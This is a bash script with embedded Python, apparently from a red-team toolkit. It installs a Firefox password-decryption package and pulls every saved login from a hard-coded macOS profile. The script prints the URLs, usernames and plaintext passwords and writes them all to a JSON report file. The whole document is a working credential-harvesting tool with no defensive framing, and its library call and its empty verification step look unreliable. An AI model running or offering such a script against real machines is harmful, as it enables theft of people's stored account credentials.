#!/bin/bash
# Firefox Password Decryption - Direct Approach
# Attempts to install firefox-decrypt and decrypt passwords

set -e

PROFILE_PATH="$HOME/Library/Application Support/Firefox/Profiles/yxo4pq2t.default-release"

echo "======================================================================"
echo "Firefox Password Decryption"
echo "======================================================================"
echo ""

# Step 1: Install firefox-decrypt using pip directly
echo "[Step 1] Installing firefox-decrypt..."
echo ""

# Try pip3 install
if command -v pip3 > /dev/null 2>&1; then
    echo "Using pip3..."
    pip3 install --user firefox-decrypt 2>&1 | tail -5 || echo "Installation attempt completed"
else
    echo "Using python3 -m pip..."
    python3 -m pip install --user firefox-decrypt 2>&1 | tail -5 || echo "Installation attempt completed"
fi

echo ""
echo "[Step 2] Verifying installation..."
echo ""

# Step 2: Decrypt passwords
echo "[Step 3] Decrypting Firefox passwords..."
echo ""

python3 << 'DECRYPT_EOF'
import sys
import os
import json

try:
    from firefox_decrypt import decrypt_passwords
    
    profile_path = os.path.expanduser("~/Library/Application Support/Firefox/Profiles/yxo4pq2t.default-release")
    
    print(f"Decrypting passwords from: {profile_path}")
    print()
    
    passwords = decrypt_passwords(profile_path)
    
    print(f"✅ Successfully decrypted {len(passwords)} passwords!")
    print()
    print("=" * 70)
    print("DECRYPTED PASSWORDS")
    print("=" * 70)
    print()
    
    # Save to file
    output_file = "redteam_kit/reports/firefox_decrypted_passwords.json"
    os.makedirs(os.path.dirname(output_file), exist_ok=True)
    
    with open(output_file, 'w') as f:
        json.dump(passwords, f, indent=2)
    
    print(f"[+] Saved to: {output_file}")
    print()
    
    # Display first 20 passwords
    for i, entry in enumerate(passwords[:20], 1):
        print(f"[Login {i}]")
        print(f"  URL: {entry.get('url', 'N/A')}")
        print(f"  Username: {entry.get('username', 'N/A')}")
        password = entry.get('password', '')
        if password:
            print(f"  Password: {password}")
        print()
    
    if len(passwords) > 20:
        print(f"... and {len(passwords) - 20} more passwords")
        print()
    
    print("=" * 70)
    print(f"Total: {len(passwords)} passwords decrypted and saved")
    print("=" * 70)
    
except ImportError:
    print("❌ firefox-decrypt library not installed")
    print()
    print("Manual installation:")
    print("  pip3 install firefox-decrypt")
    print()
    print("Then run this script again.")
    sys.exit(1)
except Exception as e:
    print(f"❌ Error: {e}")
    import traceback
    traceback.print_exc()
    sys.exit(1)
DECRYPT_EOF

echo ""
echo "✅ Complete!"

